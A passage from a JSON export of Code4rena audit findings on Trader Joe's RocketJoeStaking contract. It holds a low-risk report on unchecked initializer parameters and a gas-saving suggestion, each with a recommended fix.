{             balance = pairBalance(msg.sender);             emit UserLiquidityWithdrawn(msg.sender, address(pair), balance);         } ```  "}, {"title": "RocketJoeStaking.initialize arguments need to be checked", "html_url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/266", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-trader-joe-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Being instantiated with wrong configuration the contract will be inoperable.  If a misconfiguration is noticed too late the various types of malfunctions become possible.  ## Proof of Concept  RocketJoeStaking.initialize doesn't check input parameters, which are immutable due to initializer pattern:  https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/RocketJoeStaking.sol#L72-75   ## Recommended Mitigation Steps  Consider checking joe, rJoe addresses and lastRewardTimestamp to be non-zero and also checking rJoePerSec to be within pre specified bounds  "}, {"title": "using += to save gas", "html_url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/265", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-trader-joe-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact expensive gas  ## Proof of Concept https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/RocketJoeStaking.sol#L169-L172  ## Tools Used  ## Recommended Mitigation Steps ```             accRJoePerShare  +=             (rJoeReward * PRECISION) /             joeSupply; ```  "}]